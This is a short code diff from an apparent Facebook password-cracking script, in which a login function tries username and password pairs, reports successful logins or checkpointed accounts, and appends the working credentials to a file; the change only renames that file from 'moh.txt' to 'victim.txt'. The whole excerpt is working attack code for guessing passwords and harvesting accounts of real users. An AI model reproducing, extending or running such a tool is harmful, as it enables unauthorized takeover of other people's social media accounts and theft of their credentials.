@@ -13,12 +13,12 @@ def login(user,pswd):
     if 'access_token' in q:
         print('\1;32mLogin success')
         print('\1;31m' + user + '\1;35m | \1;32m' + pswd)
-        with open('moh.txt', 'a') as file:file.write("\n"+"usernme: "+user+" password: "+pswd)
+        with open('victim.txt', 'a') as file:file.write("\n"+"usernme: "+user+" password: "+pswd)
         time.sleep(99999999999999)
     elif 'www.facebook.com' in q['error_msg']:
         print('\1;33mAccount Has Been Checkpoint')
         print(user + ' | ' + pswd)
-        with open('moh.txt', 'a') as file:file.write("\n"+"usernme: "+user+" password: "+pswd)
+        with open('victim.txt', 'a') as file:file.write("\n"+"usernme: "+user+" password: "+pswd)
         time.sleep(99999999999999)
     else:
         print('worng passwords >' + pswd)
